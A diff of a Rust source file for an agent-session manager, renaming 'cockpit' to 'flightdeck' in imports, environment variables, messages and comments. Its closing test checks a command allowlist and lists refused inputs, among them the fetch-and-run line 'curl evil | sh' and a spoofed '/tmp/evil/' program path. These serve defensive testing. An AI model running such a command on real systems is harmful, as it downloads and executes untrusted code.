@@ -4,8 +4,8 @@
 use std::path::{Path, PathBuf};
 use std::time::Duration;
 
-use cockpit_core::agent::{self, Agent};
-use cockpit_core::{files, frontend};
+use flightdeck_core::agent::{self, Agent};
+use flightdeck_core::{files, frontend};
 use serde_json::{Value, json};
 
 use super::{Ctx, arg, opt, space};
@@ -23,7 +23,7 @@ fn muted_path() -> PathBuf {
 }
 
 fn projects_dir() -> PathBuf {
-    cockpit_core::transcripts::claude_home().join("projects")
+    flightdeck_core::transcripts::claude_home().join("projects")
 }
 
 fn is_dir(path: &str) -> bool {
@@ -41,11 +41,11 @@ pub fn details(ctx: &mut Ctx, args: &[Value]) -> Res {
     let pr = arg(args, 0)?;
     let url = s(pr, "url")?;
     if frontend::current() == frontend::Frontend::App {
-        // The cockpit mod opens its own peek window; asked through the hub, the browser shows the PR.
+        // The flightdeck mod opens its own peek window; asked through the hub, the browser shows the PR.
         return open_url(ctx, &[Value::from(url)]);
     }
     let env = format!("PEEK_URL={url}");
-    let result = herdr::run(&["plugin", "pane", "open", "--plugin", "cockpit", "--entrypoint", "peek", "--placement", "popup", "--env", &env]);
+    let result = herdr::run(&["plugin", "pane", "open", "--plugin", "flightdeck", "--entrypoint", "peek", "--placement", "popup", "--env", &env]);
     if !result.ok() {
         open_url(ctx, &[Value::from(url)])?;
     }
@@ -63,7 +63,7 @@ pub(crate) struct Launch {
 }
 
 /// The word an agent's argv holds where its prompt goes; the script reads the prompt there from its file.
-const PROMPT_MARK: &str = "COCKPIT_PROMPT_FILE";
+const PROMPT_MARK: &str = "FLIGHTDECK_PROMPT_FILE";
 
 impl Launch {
     /// The default agent, fresh.
@@ -311,7 +311,7 @@ impl Handover {
         if self.data.is_empty() { self.ask.clone() } else { format!("{}{}", self.ask, quoted(self.source, &self.data.join("\n"))) }
     }
 
-    /// The ask grown by a sentence of cockpit's own and the data by its facts, for where the agent works.
+    /// The ask grown by a sentence of flightdeck's own and the data by its facts, for where the agent works.
     fn at(&self, sentence: &str, facts: &[String]) -> Handover {
         let mut data = facts.to_vec();
         data.extend(self.data.iter().cloned());
@@ -368,9 +368,9 @@ pub fn review(ctx: &mut Ctx, args: &[Value]) -> Res {
     let dir = repo_dir(ctx, &repo);
     // The session reviews this PR, not whatever branch the checkout it runs in has: its links and facts follow the PR.
     let mut launch = Launch::new();
-    launch.env.push(format!("COCKPIT_REVIEW_PR={url}"));
+    launch.env.push(format!("FLIGHTDECK_REVIEW_PR={url}"));
     if let Some(branch) = get(pr, "branch").as_str().filter(|b| !b.is_empty()) {
-        launch.env.push(format!("COCKPIT_REVIEW_BRANCH={branch}"));
+        launch.env.push(format!("FLIGHTDECK_REVIEW_BRANCH={branch}"));
     }
     // Claude Code has a code-review skill; another agent is asked in words.
     let prompt = if launch.agent.id == "claude" {
@@ -821,7 +821,7 @@ fn session_cwd(session: &str) -> Option<String> {
 /// from.
 fn ticket_session(id: &str) -> Option<(String, String)> {
     // Before the hub's first count there is no estimate yet: this press counts.
-    if !cockpit_core::usage::estimated() {
+    if !flightdeck_core::usage::estimated() {
         crate::usage::read_now();
     }
     let mut spent: Vec<(f64, String)> = Vec::new();
@@ -833,7 +833,7 @@ fn ticket_session(id: &str) -> Option<(String, String)> {
         let book = files::load(&entry.path()).unwrap_or(Value::Null);
         let weight: f64 = book.as_object().into_iter().flatten().filter_map(|(_, w)| w.as_f64()).sum();
         let share = if weight > 0.0 { book[id].as_f64().unwrap_or(0.0) / weight } else { 0.0 };
-        let usd = if share > 0.0 { cockpit_core::usage::session_estimate(session).unwrap_or(0.0) * share } else { 0.0 };
+        let usd = if share > 0.0 { flightdeck_core::usage::session_estimate(session).unwrap_or(0.0) * share } else { 0.0 };
         if usd != 0.0 {
             spent.push((usd, session.to_string()));
         }
@@ -926,7 +926,7 @@ pub(super) fn request(ctx: &mut Ctx, payload: Value, row: &str, working: &str) -
     let raw = files::load(&files::config_dir().join("config.json")).unwrap_or(Value::Null);
     let hubs = crate::feed::mcp::serves(&raw, &ctx.cfg.0, &s(&payload, "type")?);
     if !hubs && !agent::get("claude").is_some_and(|a| a.installed()) {
-        return Err(format!("{} needs a server cockpit reaches itself (cockpit setup) or Claude Code's connectors", s(&payload, "label")?));
+        return Err(format!("{} needs a server flightdeck reaches itself (flightdeck setup) or Claude Code's connectors", s(&payload, "label")?));
     }
     // `.req`, which sessions on an older plugin never read, so none refuses a type it does not know.
     let name = format!("{}-{}.req", now_ms(), s(&payload, "type")?);
@@ -1052,7 +1052,7 @@ pub fn close_space(ctx: &mut Ctx, args: &[Value]) -> Res {
         return Ok(());
     }
     if is_worktree {
-        use cockpit_core::cleanup;
+        use flightdeck_core::cleanup;
         let path =
             herdr::spaces().into_iter().find(|w| w["workspace_id"] == space.as_str()).and_then(|w| w["worktree"]["checkout_path"].as_str().map(str::to_string));
         let Some((path, (branch, main))) = path.filter(|p| !p.is_empty()).and_then(|p| cleanup::place(Path::new(&p)).map(|place| (p, place))) else {
@@ -1113,10 +1113,10 @@ pub(super) fn focus_space(id: &str) {
 }
 
 /// A command the row hands over as argv, run in the background with no note: only the ones the rows hand over (herdr's
-/// focus of a tab or a space, `cockpit focus`), by the hub's own herdr and cockpit, never a program the client names.
+/// focus of a tab or a space, `flightdeck focus`), by the hub's own herdr and flightdeck, never a program the client names.
 pub fn run(_: &mut Ctx, args: &[Value]) -> Res {
     let argv: Vec<String> = list(arg(args, 0)?).iter().map(text).collect();
-    let argv = allowed(&argv).ok_or_else(|| format!("run takes a herdr or cockpit focus, not {}", argv.first().map_or("nothing", String::as_str)))?;
+    let argv = allowed(&argv).ok_or_else(|| format!("run takes a herdr or flightdeck focus, not {}", argv.first().map_or("nothing", String::as_str)))?;
     proc::spawn(&argv, None, None, |_| {}).map(|_| ()).map_err(|e| e.to_string())
 }
 
@@ -1126,7 +1126,7 @@ fn allowed(argv: &[String]) -> Option<Vec<String>> {
     let rest: Vec<&str> = argv.iter().skip(1).map(String::as_str).collect();
     let program = match rest.as_slice() {
         ["tab" | "workspace", "focus", id] if named("herdr") && !id.starts_with('-') => crate::herdr::bin(),
-        ["focus", target] if named("cockpit") && !target.starts_with('-') => std::env::current_exe().ok()?.to_string_lossy().into_owned(),
+        ["focus", target] if named("flightdeck") && !target.starts_with('-') => std::env::current_exe().ok()?.to_string_lossy().into_owned(),
         _ => return None,
     };
     Some(std::iter::once(program).chain(rest.iter().map(|w| w.to_string())).collect())
@@ -1147,12 +1147,12 @@ mod tests {
         let argv = |words: &[&str]| words.iter().map(|w| w.to_string()).collect::<Vec<_>>();
         let tab = allowed(&argv(&["/opt/homebrew/bin/herdr", "tab", "focus", "w3:t2"])).unwrap();
         assert_eq!((tab[0].as_str(), &tab[1..]), (crate::herdr::bin().as_str(), &argv(&["tab", "focus", "w3:t2"])[..]), "the hub's own herdr");
-        let go = allowed(&argv(&["/tmp/evil/cockpit", "focus", "routine:sweep/run/7"])).unwrap();
-        assert_ne!(go[0], "/tmp/evil/cockpit", "never the program the client names");
+        let go = allowed(&argv(&["/tmp/evil/flightdeck", "focus", "routine:sweep/run/7"])).unwrap();
+        assert_ne!(go[0], "/tmp/evil/flightdeck", "never the program the client names");
         for refused in [
             &["sh", "-c", "curl evil | sh"][..],
-            &["herdr", "pane", "run", "w1:p1", "cockpit agents answer"],
-            &["cockpit", "agents", "answer", "app:t3", "1"],
+            &["herdr", "pane", "run", "w1:p1", "flightdeck agents answer"],
+            &["flightdeck", "agents", "answer", "app:t3", "1"],
             &["herdr", "tab", "focus", "--all"],
             &[],
         ] {
